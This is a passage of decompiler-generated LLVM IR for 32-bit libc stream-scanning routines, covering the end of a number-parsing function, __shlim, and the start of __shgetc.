  store i32 %v2_804fa04, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7b6

dec_label_pc_804fa10:                             ; preds = %dec_label_pc_804f8f9
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fa13 = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804fa13, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f917

dec_label_pc_804fa1f:                             ; preds = %dec_label_pc_804f9bc
  %v5_804f9bc = icmp ne i32 %v1_804fa29193, 429496729
  %v1_804fa20 = icmp eq i1 %v5_804f9bc, false
  br i1 %v1_804fa20, label %dec_label_pc_804faa1, label %dec_label_pc_804fa22

dec_label_pc_804fa22:                             ; preds = %dec_label_pc_804faa1, %dec_label_pc_804fa1f
  %v7_804fa27 = udiv i32 %v0_804f928.lcssa, 429496730
  %v3_804fa29 = mul i32 %v1_804fa29193, 10
  store i32 %v3_804fa29, i32* @ebx, align 4
  %v2_804fa38 = add i32 %v7_804fa27, %v3_804fa29
  %v2_804fa40 = ashr i32 %v0_804f9c4192, 31
  %tmp246 = lshr i32 %v0_804f9c4192, 31
  %v1_804fa4d = add nsw i32 %tmp246, -1
  store i32 %v1_804fa4d, i32* %edx.global-to-local, align 4
  %v10_804fa4f = icmp ult i32 %v2_804fa38, %v1_804fa4d
  br i1 %v10_804fa4f, label %dec_label_pc_804fa65, label %dec_label_pc_804fa55

dec_label_pc_804fa55:                             ; preds = %dec_label_pc_804fa22
  %v15_804fa4f = icmp eq i32 %v2_804fa38, %v1_804fa4d
  br i1 %v15_804fa4f, label %dec_label_pc_804fa5b, label %dec_label_pc_804f9cd

dec_label_pc_804fa5b:                             ; preds = %dec_label_pc_804fa55
  br i1 true, label %dec_label_pc_804fa65, label %dec_label_pc_804f9cd

dec_label_pc_804fa65:                             ; preds = %dec_label_pc_804fa5b, %dec_label_pc_804fa22
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804fa6c = load i32, i32* %v2_804f527, align 4
  %v4_804fa6f = load i32, i32* %v3_804f52a, align 4
  %v10_804fa6f = icmp ult i32 %v3_804fa6c, %v4_804fa6f
  %v1_804fa72 = icmp eq i1 %v10_804fa6f, false
  br i1 %v1_804fa72, label %dec_label_pc_804fa95, label %dec_label_pc_804fa74

dec_label_pc_804fa74:                             ; preds = %dec_label_pc_804fa65
  %v1_804fa74 = inttoptr i32 %v3_804fa6c to i8*
  %v2_804fa74 = load i8, i8* %v1_804fa74, align 1
  %v3_804fa74 = zext i8 %v2_804fa74 to i32
  store i32 %v3_804fa74, i32* @ebp, align 4
  %v1_804fa77 = add i32 %v3_804fa6c, 1
  store i32 %v1_804fa77, i32* %v2_804f527, align 4
  %v0_804fa81.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804fa7d

dec_label_pc_804fa7d:                             ; preds = %dec_label_pc_804fa95, %dec_label_pc_804fa74
  %v0_804fa81 = phi i32 [ %v2_804fa98, %dec_label_pc_804fa95 ], [ %v0_804fa81.pre, %dec_label_pc_804fa74 ]
  %v1_804fa81 = add i32 %v0_804fa81, -48
  %v8_804fa8c = add i32 %v2_804fa38, %v2_804fa40
  store i32 %v8_804fa8c, i32* @edi, align 4
  %tmp247 = icmp ult i32 %v1_804fa81, 10
  br i1 %tmp247, label %dec_label_pc_804f9bc, label %dec_label_pc_804f939

dec_label_pc_804fa95:                             ; preds = %dec_label_pc_804fa65
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fa98 = call i32 @__shgetc(i32 %v4_804f520)
  br label %dec_label_pc_804fa7d

dec_label_pc_804faa1:                             ; preds = %dec_label_pc_804fa1f
  %tmp248 = icmp ult i32 %v0_804f928.lcssa, -1717986918
  br i1 %tmp248, label %dec_label_pc_804fa22, label %dec_label_pc_804f9cd

dec_label_pc_804fab5:                             ; preds = %dec_label_pc_804fab5.lr.ph, %bb113
  %stack_var_-21.1177 = phi i8 [ %stack_var_-21.0, %dec_label_pc_804fab5.lr.ph ], [ %v3_804fae5, %bb113 ]
  %v0_804f6e3176 = phi i32 [ 0, %dec_label_pc_804fab5.lr.ph ], [ %v2_804faee, %bb113 ]
  %tmp249 = icmp ult i32 %v0_804f6e3176, 134217728
  br i1 %tmp249, label %dec_label_pc_804fac6, label %dec_label_pc_804f6d2

dec_label_pc_804fac6:                             ; preds = %dec_label_pc_804fab5
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804facd = load i32, i32* %v2_804f527, align 4
  %v4_804fad0 = load i32, i32* %v3_804f52a, align 4
  %v10_804fad0 = icmp ult i32 %v3_804facd, %v4_804fad0
  %v1_804fad3 = icmp eq i1 %v10_804fad0, false
  br i1 %v1_804fad3, label %dec_label_pc_804faf9, label %dec_label_pc_804fad5

dec_label_pc_804fad5:                             ; preds = %dec_label_pc_804fac6
  %v1_804fad7 = inttoptr i32 %v3_804facd to i8*
  %v2_804fad7 = load i8, i8* %v1_804fad7, align 1
  %v3_804fad7 = zext i8 %v2_804fad7 to i32
  store i32 %v3_804fad7, i32* %edx.global-to-local, align 4
  %v1_804fada = add i32 %v3_804facd, 1
  %v6_804fada = xor i32 %v3_804facd, -2147483648
  %v7_804fada = and i32 %v1_804fada, %v6_804fada
  %v8_804fada = icmp slt i32 %v7_804fada, 0
  store i1 %v8_804fada, i1* @of, align 1
  store i32 %v1_804fada, i32* %v2_804f527, align 4
  %v0_804fae5.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fae0

dec_label_pc_804fae0:                             ; preds = %dec_label_pc_804faf9, %dec_label_pc_804fad5
  %v0_804fae5 = phi i32 [ %v2_804fafc, %dec_label_pc_804faf9 ], [ %v0_804fae5.pre, %dec_label_pc_804fad5 ]
  %v1_804fae5 = add i32 %v0_804fae5, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804fae5 = inttoptr i32 %v1_804fae5 to i8*
  %v3_804fae5 = load i8, i8* %v2_804fae5, align 1
  %v4_804fae5 = zext i8 %v3_804fae5 to i32
  store i32 %v4_804fae5, i32* %edx.global-to-local, align 4
  %v0_804faec = load i32, i32* @ebx, align 4
  br i1 %v4_804faec, label %bb113, label %bb112

bb112:                                            ; preds = %dec_label_pc_804fae0
  %v5_804faec = shl i32 %v0_804faec, %v2_804faec
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_804fae0, %bb112
  %v0_804faee = phi i32 [ %v0_804faec, %dec_label_pc_804fae0 ], [ %v5_804faec, %bb112 ]
  %v1_804faee = load i32, i32* @esi, align 4
  %v2_804faee = or i32 %v1_804faee, %v0_804faee
  store i32 %v2_804faee, i32* @ebx, align 4
  store i32 %v4_804fae5, i32* @esi, align 4
  %v11_804f6c5 = icmp ult i32 %v4_804fae5, %v4_804f697
  br i1 %v11_804f6c5, label %dec_label_pc_804fab5, label %dec_label_pc_804f6d2

dec_label_pc_804faf9:                             ; preds = %dec_label_pc_804fac6
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fafc = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804fafc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fae0

dec_label_pc_804fb05:                             ; preds = %dec_label_pc_804f8b9, %dec_label_pc_804f8c4.preheader
  %stack_var_-21.5.lcssa = phi i8 [ %stack_var_-21.5.ph, %dec_label_pc_804f8c4.preheader ], [ %v3_804f8b9, %dec_label_pc_804f8b9 ]
  %v0_804fb05 = load i64, i64* %stack_var_-124, align 8
  %v1_804fb05 = trunc i64 %v0_804fb05 to i32
  %v2_804fb05 = call i32 @__errno_location(i32 %v1_804fb05)
  store i32 %arg4, i32* @esi, align 4
  store i32 %tmp97, i32* @edi, align 4
  %v1_804fb12 = inttoptr i32 %v2_804fb05 to i32*
  store i32 34, i32* %v1_804fb12, align 4
  %v1_804fb1c = urem i32 %arg4, 2
  %v2_804fb1c = icmp eq i32 %v1_804fb1c, 0
  %stack_var_-32.5. = select i1 %v2_804fb1c, i32 %stack_var_-32.5.ph, i32 0
  br label %dec_label_pc_804f939

dec_label_pc_804fb34:                             ; preds = %dec_label_pc_804f604
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fb37 = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804fb37, i32* @ebp, align 4
  br label %dec_label_pc_804f620

dec_label_pc_804fb43:                             ; preds = %dec_label_pc_804f640
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804fb4a = load i32, i32* %v2_804f527, align 4
  %v4_804fb4d = load i32, i32* %v3_804f52a, align 4
  %v10_804fb4d = icmp ult i32 %v3_804fb4a, %v4_804fb4d
  %v1_804fb50 = icmp eq i1 %v10_804fb4d, false
  br i1 %v1_804fb50, label %dec_label_pc_804fba7, label %dec_label_pc_804fb52

dec_label_pc_804fb52:                             ; preds = %dec_label_pc_804fb43
  %v1_804fb52 = inttoptr i32 %v3_804fb4a to i8*
  %v2_804fb52 = load i8, i8* %v1_804fb52, align 1
  %v3_804fb52 = zext i8 %v2_804fb52 to i32
  store i32 %v3_804fb52, i32* @ebp, align 4
  %v1_804fb55 = add i32 %v3_804fb4a, 1
  store i32 %v1_804fb55, i32* %v2_804f527, align 4
  %v0_804fb5b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804fb5b

dec_label_pc_804fb5b:                             ; preds = %dec_label_pc_804fba7, %dec_label_pc_804fb52
  %v0_804fb6d = phi i32 [ %v2_804fbaa, %dec_label_pc_804fba7 ], [ %v0_804fb5b.pre, %dec_label_pc_804fb52 ]
  %v1_804fb5d = or i32 %v0_804fb6d, 32
  %v9_804fb60 = icmp eq i32 %v1_804fb5d, 120
  br i1 %v9_804fb60, label %dec_label_pc_804fbb3, label %dec_label_pc_804fb65

dec_label_pc_804fb65:                             ; preds = %dec_label_pc_804fb5b
  %v0_804fb65 = load i32, i32* @ebx, align 4
  %v3_804fb65 = trunc i32 %v0_804fb65 to i8
  %v4_804fb65 = icmp eq i8 %v3_804fb65, 0
  br i1 %v4_804fb65, label %dec_label_pc_804f670, label %dec_label_pc_804fb6d

dec_label_pc_804fb6d:                             ; preds = %dec_label_pc_804fb65
  %v1_804fb6d = add i32 %v0_804fb6d, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804fb6d = inttoptr i32 %v1_804fb6d to i8*
  %v3_804fb6d = load i8, i8* %v2_804fb6d, align 1
  %v4_804fb6d = zext i8 %v3_804fb6d to i32
  store i32 %v4_804fb6d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f695

dec_label_pc_804fb8d:                             ; preds = %dec_label_pc_804f959
  %v1_804fb8d = sext i8 %stack_var_-21.6 to i32
  %v2_804fb8d = call i32 @__errno_location(i32 %v1_804fb8d)
  %v4_804fb92 = add i32 %arg4, -1
  %not.v7_804fb92 = icmp eq i32 %arg4, 0
  %v6_804fb97 = sext i1 %not.v7_804fb92 to i32
  %v7_804fb97 = add i32 %v6_804fb97, %tmp97
  %v1_804fb9c = inttoptr i32 %v2_804fb8d to i32*
  store i32 34, i32* %v1_804fb9c, align 4
  br label %dec_label_pc_804f5e5

dec_label_pc_804fba7:                             ; preds = %dec_label_pc_804fb43
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fbaa = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804fbaa, i32* @ebp, align 4
  br label %dec_label_pc_804fb5b

dec_label_pc_804fbb3:                             ; preds = %dec_label_pc_804fb5b
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804fbba = load i32, i32* %v2_804f527, align 4
  %v4_804fbbd = load i32, i32* %v3_804f52a, align 4
  %v10_804fbbd = icmp ult i32 %v3_804fbba, %v4_804fbbd
  %v1_804fbc0 = icmp eq i1 %v10_804fbbd, false
  br i1 %v1_804fbc0, label %dec_label_pc_804fc39, label %dec_label_pc_804fbc2

dec_label_pc_804fbc2:                             ; preds = %dec_label_pc_804fbb3
  %v1_804fbc4 = inttoptr i32 %v3_804fbba to i8*
  %v2_804fbc4 = load i8, i8* %v1_804fbc4, align 1
  %v3_804fbc4 = zext i8 %v2_804fbc4 to i32
  store i32 %v3_804fbc4, i32* %edx.global-to-local, align 4
  %v1_804fbc7 = add i32 %v3_804fbba, 1
  store i32 %v1_804fbc7, i32* %v2_804f527, align 4
  %v0_804fbcd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fbcd

dec_label_pc_804fbcd:                             ; preds = %dec_label_pc_804fc39, %dec_label_pc_804fbc2
  %v0_804fbcd = phi i32 [ %v2_804fc3c, %dec_label_pc_804fc39 ], [ %v0_804fbcd.pre, %dec_label_pc_804fbc2 ]
  %v1_804fbcd = add i32 %v0_804fbcd, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804fbcd = inttoptr i32 %v1_804fbcd to i8*
  %v3_804fbcd = load i8, i8* %v2_804fbcd, align 1
  %v4_804fbcd = zext i8 %v3_804fbcd to i32
  store i32 %v4_804fbcd, i32* %edx.global-to-local, align 4
  %tmp250 = icmp ult i8 %v3_804fbcd, 16
  br i1 %tmp250, label %dec_label_pc_804f695, label %dec_label_pc_804fbf1

dec_label_pc_804fbf1:                             ; preds = %dec_label_pc_804fbcd
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804fbf8 = load i32, i32* %v3_804f52a, align 4
  %v1_804fbfb = icmp eq i32 %v3_804fbf8, 0
  br i1 %v1_804fbfb, label %dec_label_pc_804fc03, label %dec_label_pc_804fbff

dec_label_pc_804fbff:                             ; preds = %dec_label_pc_804fbf1
  %v3_804fbff = load i32, i32* %v2_804f527, align 4
  %v4_804fbff = add i32 %v3_804fbff, -1
  store i32 %v4_804fbff, i32* %v2_804f527, align 4
  br label %dec_label_pc_804fc03

dec_label_pc_804fc03:                             ; preds = %dec_label_pc_804fbf1, %dec_label_pc_804fbff
  %v1_804fc0a = icmp eq i32 %arg3, 0
  br i1 %v1_804fc0a, label %dec_label_pc_804fc45, label %dec_label_pc_804fc0e

dec_label_pc_804fc0e:                             ; preds = %dec_label_pc_804fc03
  %v3_804fc25 = load i32, i32* %v3_804f52a, align 4
  %v1_804fc28 = icmp eq i32 %v3_804fc25, 0
  br i1 %v1_804fc28, label %dec_label_pc_804f5e5, label %dec_label_pc_804fc30

dec_label_pc_804fc30:                             ; preds = %dec_label_pc_804fc0e
  %v3_804fc30 = load i32, i32* %v2_804f527, align 4
  %v4_804fc30 = add i32 %v3_804fc30, -1
  store i32 %v4_804fc30, i32* %v2_804f527, align 4
  br label %dec_label_pc_804f5e5

dec_label_pc_804fc39:                             ; preds = %dec_label_pc_804fbb3
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fc3c = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804fc3c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fbcd

dec_label_pc_804fc45:                             ; preds = %dec_label_pc_804fc03
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v6_804fc5f = call i32 @__shlim(i32 %v4_804f520, i32 0, i32 0)
  br label %dec_label_pc_804f5e5

; uselistorder directives
  uselistorder i32 %v2_804fc3c, { 1, 0 }
  uselistorder i8 %v3_804fbcd, { 0, 2, 1 }
  uselistorder i32 %v3_804fbba, { 1, 0, 2 }
  uselistorder i32 %v2_804fbaa, { 1, 0 }
  uselistorder i8 %v3_804fb6d, { 1, 0 }
  uselistorder i32 %v0_804fb6d, { 1, 2, 0 }
  uselistorder i32 %v3_804fb4a, { 1, 0, 2 }
  uselistorder i32 %v2_804fafc, { 1, 0 }
  uselistorder i32 %v2_804faee, { 2, 0, 1 }
  uselistorder i32 %v4_804fae5, { 1, 0, 2 }
  uselistorder i8 %v3_804fae5, { 2, 0, 1 }
  uselistorder i32 %v3_804facd, { 1, 2, 0, 3 }
  uselistorder i32 %v8_804fa8c, { 1, 0 }
  uselistorder i32 %v0_804fa81, { 1, 0 }
  uselistorder i32 %v3_804fa6c, { 1, 0, 2 }
  uselistorder i32 %v2_804fa38, { 1, 0, 2 }
  uselistorder i32 %v2_804fa13, { 1, 0 }
  uselistorder i32 %v2_804fa04, { 1, 0 }
  uselistorder i8 %v3_804f9da, { 1, 0 }
  uselistorder i32 %v1_804fa29193, { 2, 1, 0 }
  uselistorder i32 %v2_804f996, { 1, 0 }
  uselistorder i32 %v0_804f985, { 1, 0 }
  uselistorder i1 %v15_804f94b, { 1, 0 }
  uselistorder i32 %v0_804f94b, { 1, 0, 2 }
  uselistorder i32 %stack_var_-32.6, { 0, 4, 3, 1, 5, 2 }
  uselistorder i32 %v1_804f920.lcssa, { 1, 0 }
  uselistorder i32 %v1_804f920, { 1, 0, 2 }
  uselistorder i32 %v4_804f91a, { 0, 2, 1 }
  uselistorder i32 %v0_804f91e, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804f900, { 1, 0, 2 }
  uselistorder i32 %v0_804f928207, { 1, 0 }
  uselistorder i32 %v2_804f8e8, { 1, 0 }
  uselistorder i32 %v3_804f8dd, { 2, 0, 1 }
  uselistorder i32 %v4_804f89d, { 0, 2, 1 }
  uselistorder i8 %v3_804f89d, { 0, 2, 1 }
  uselistorder i32 %v0_804f886, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_804f86d, { 1, 0, 2 }
  uselistorder i32 %stack_var_8.2.off0.ph, { 1, 0 }
  uselistorder i32 %v0_804f84b.pre, { 1, 0 }
  uselistorder i32 %v1_804f82a, { 1, 0 }
  uselistorder i32 %v0_804f82a, { 1, 2, 0 }
  uselistorder i32 %v2_804f7cb, { 0, 2, 1 }
  uselistorder i32 %v4_804f7bd, { 1, 0, 2 }
  uselistorder i8 %v3_804f7bd, { 0, 2, 1 }
  uselistorder i32 %v3_804f79f, { 1, 0, 2 }
  uselistorder i32 %v0_804f7e3150, { 1, 0 }
  uselistorder i32 %v3_804f777, { 2, 0, 1 }
  uselistorder i32 %v4_804f735, { 1, 0 }
  uselistorder i32 %v0_804f71f, { 1, 0 }
  uselistorder i32 %v0_804f718.pre, { 1, 0, 2 }
  uselistorder i32 %v2_804faec, { 6, 9, 3, 4, 7, 8, 0, 1, 2, 5 }
  uselistorder i32 %v4_804f6b2, { 1, 0 }
  uselistorder i32 %v4_804f697, { 16, 13, 1, 2, 3, 4, 5, 6, 11, 14, 10, 17, 18, 0, 15, 8, 7, 9, 12 }
  uselistorder i8 %stack_var_-21.0, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32 %v1_804f920198, { 1, 2, 0 }
  uselistorder i32 %v4_804f672, { 2, 1, 0 }
  uselistorder i32 %v0_804f687, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804f640, { 1, 3, 0, 2 }
  uselistorder i32 %stack_var_-32.2, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v4_804f637, { 0, 2, 1 }
  uselistorder i1 %v2_804f635, { 1, 0 }
  uselistorder i32 %v1_804f628, { 1, 0 }
  uselistorder i32 %v0_804f622, { 1, 0 }
  uselistorder i32 %v3_804f60b, { 1, 0, 2 }
  uselistorder i32 %v2_804f5f8, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 0 }
  uselistorder i1 %v2_804f56c, { 1, 0 }
  uselistorder i32 %v2_804f56e, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v3_804f527, { 1, 0, 2 }
  uselistorder i32* %v3_804f52a, { 9, 10, 11, 12, 3, 6, 0, 7, 1, 4, 5, 2, 13, 8, 14 }
  uselistorder i32* %v2_804f527, { 7, 8, 9, 10, 11, 26, 14, 27, 5, 21, 13, 24, 1, 2, 12, 25, 19, 4, 3, 22, 0, 23, 20, 6, 17, 28, 15, 16, 18, 29 }
  uselistorder i32 %v4_804f520, { 18, 5, 19, 20, 8, 21, 9, 3, 13, 7, 15, 6, 0, 1, 11, 16, 2, 14, 4, 12, 22, 10, 17, 25, 23, 24 }
  uselistorder i32 %v0_804f4f2, { 1, 0 }
  uselistorder i64* %stack_var_-124, { 14, 13, 12, 11, 16, 10, 9, 8, 7, 6, 15, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp97, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 429496730, { 1, 0 }
  uselistorder i32 34, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 429496729, { 1, 0 }
  uselistorder i32 (i32)* @__shgetc, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__shlim, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8054601.384 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 5, 2, 7, 1, 3, 4, 6 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4, 5 }
  uselistorder i64 %arg1, { 8, 7, 4, 2, 9, 6, 5, 11, 12, 13, 10, 1, 0, 3, 14 }
  uselistorder label %dec_label_pc_804fc03, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_804fab5, { 1, 0 }
  uselistorder label %dec_label_pc_804f9cd, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f98b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f959, { 1, 0 }
  uselistorder label %dec_label_pc_804f94b, { 1, 0 }
  uselistorder label %dec_label_pc_804f939, { 6, 1, 7, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_804f8f1, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d6, { 1, 0 }
  uselistorder label %dec_label_pc_804f8c4.preheader, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804f806, { 1, 0 }
  uselistorder label %dec_label_pc_804f790, { 1, 0 }
  uselistorder label %dec_label_pc_804f754, { 1, 0 }
  uselistorder label %dec_label_pc_804f723, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %dec_label_pc_804f709._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f6f3, { 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_804f6d2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f5e5, { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_804f5ca, { 1, 0 }
  uselistorder label %dec_label_pc_804f5ab, { 1, 0 }
  uselistorder label %dec_label_pc_804f585, { 1, 0 }
}

define i32 @__shlim(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fc8b = load i32, i32* @ebx, align 4
  store i32 %v0_804fc8b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v1_804fc9e = add i32 %arg1, 8
  %v2_804fc9e = inttoptr i32 %v1_804fc9e to i32*
  %v3_804fc9e = load i32, i32* %v2_804fc9e, align 4
  store i32 %v3_804fc9e, i32* %ebp.global-to-local, align 4
  %v2_804fca1 = add i32 %arg1, 112
  %v3_804fca1 = inttoptr i32 %v2_804fca1 to i32*
  store i32 %arg3, i32* %v3_804fca1, align 4
  %v0_804fca4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fca4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fca4 = add i32 %v1_804fca4, 108
  %v3_804fca4 = inttoptr i32 %v2_804fca4 to i32*
  store i32 %v0_804fca4, i32* %v3_804fca4, align 4
  %v0_804fca7 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804fca7, i32* %eax.global-to-local, align 4
  %v1_804fca9 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fca9 = add i32 %v1_804fca9, 4
  %v3_804fca9 = inttoptr i32 %v2_804fca9 to i32*
  %v4_804fca9 = load i32, i32* %v3_804fca9, align 4
  %v5_804fca9 = sub i32 %v0_804fca7, %v4_804fca9
  store i32 %v5_804fca9, i32* %esi.global-to-local, align 4
  store i32 %v5_804fca9, i32* %ebx.global-to-local, align 4
  %v2_804fcb0 = add i32 %v1_804fca9, 116
  %v3_804fcb0 = inttoptr i32 %v2_804fcb0 to i32*
  store i32 %v5_804fca9, i32* %v3_804fcb0, align 4
  %v0_804fcb3 = load i32, i32* %ecx.global-to-local, align 4
  %v0_804fcb5 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fcb5 = ashr i32 %v0_804fcb5, 31
  store i32 %v2_804fcb5, i32* %esi.global-to-local, align 4
  %v1_804fcb8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fcb8 = or i32 %v1_804fcb8, %v0_804fcb3
  %v3_804fcb8 = icmp eq i32 %v2_804fcb8, 0
  store i32 %v2_804fcb8, i32* %eax.global-to-local, align 4
  %v1_804fcba = load i32, i32* %edi.global-to-local, align 4
  %v2_804fcba = add i32 %v1_804fcba, 120
  %v3_804fcba = inttoptr i32 %v2_804fcba to i32*
  store i32 %v2_804fcb5, i32* %v3_804fcba, align 4
  br i1 %v3_804fcb8, label %dec_label_pc_804fcc3, label %dec_label_pc_804fcbf

dec_label_pc_804fcbf:                             ; preds = %entry
  %v0_804fcbf = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fcbf = load i32, i32* %esi.global-to-local, align 4
  %v7_804fcc1 = icmp sgt i32 %v0_804fcbf, %v1_804fcbf
  br i1 %v7_804fcc1, label %dec_label_pc_804fcc3, label %dec_label_pc_804fce0

dec_label_pc_804fcc3:                             ; preds = %dec_label_pc_804fcbf, %dec_label_pc_804fcf0, %entry
  %v0_804fcc3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fcc3 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fcc3 = add i32 %v1_804fcc3, 104
  %v3_804fcc3 = inttoptr i32 %v2_804fcc3 to i32*
  store i32 %v0_804fcc3, i32* %v3_804fcc3, align 4
  br label %dec_label_pc_804fcc6

dec_label_pc_804fcc6:                             ; preds = %dec_label_pc_804fce2, %dec_label_pc_804fcc3
  %v2_804fcc6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fcc6, i32* @ebx, align 4
  %v0_804fcd8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804fcd8

dec_label_pc_804fce0:                             ; preds = %dec_label_pc_804fcbf
  %v5_804fce0 = icmp slt i32 %v0_804fcbf, %v1_804fcbf
  %v1_804fce5.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v5_804fce0, label %dec_label_pc_804fce2, label %dec_label_pc_804fcf0

dec_label_pc_804fce2:                             ; preds = %dec_label_pc_804fce0, %dec_label_pc_804fcf0
  %v0_804fce2 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fce2 = add i32 %v0_804fce2, 4
  %v2_804fce2 = inttoptr i32 %v1_804fce2 to i32*
  %v3_804fce2 = load i32, i32* %v2_804fce2, align 4
  %v2_804fce5 = add i32 %v3_804fce2, %v1_804fce5.pre
  store i32 %v2_804fce5, i32* %eax.global-to-local, align 4
  %v2_804fce7 = add i32 %v0_804fce2, 104
  %v3_804fce7 = inttoptr i32 %v2_804fce7 to i32*
  store i32 %v2_804fce5, i32* %v3_804fce7, align 4
  br label %dec_label_pc_804fcc6

dec_label_pc_804fcf0:                             ; preds = %dec_label_pc_804fce0
  %v1_804fcf0 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804fcf0 = icmp ult i32 %v1_804fce5.pre, %v1_804fcf0
  %v1_804fcf2 = icmp eq i1 %v7_804fcf0, false
  br i1 %v1_804fcf2, label %dec_label_pc_804fcc3, label %dec_label_pc_804fce2

; uselistorder directives
  uselistorder i32 %v1_804fce5.pre, { 1, 0 }
  uselistorder i32 %v1_804fcbf, { 1, 0 }
  uselistorder i32 %v0_804fcbf, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fce2, { 1, 0 }
  uselistorder label %dec_label_pc_804fcc3, { 1, 0, 2 }
}

define i32 @__shgetc(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_804fd17 = add i32 %arg1, 112
  %v2_804fd17 = inttoptr i32 %v1_804fd17 to i32*
  %v3_804fd17 = load i32, i32* %v2_804fd17, align 4
  store i32 %v3_804fd17, i32* %edx.global-to-local, align 4
  %v1_804fd1a = add i32 %arg1, 108
  %v2_804fd1a = inttoptr i32 %v1_804fd1a to i32*
  %v3_804fd1a = load i32, i32* %v2_804fd1a, align 4
  store i32 %v3_804fd1a, i32* @eax, align 4
  %v2_804fd1f = or i32 %v3_804fd1a, %v3_804fd17
  %v3_804fd1f = icmp eq i32 %v2_804fd1f, 0
  br i1 %v3_804fd1f, label %dec_label_pc_804fd57, label %dec_label_pc_804fd23

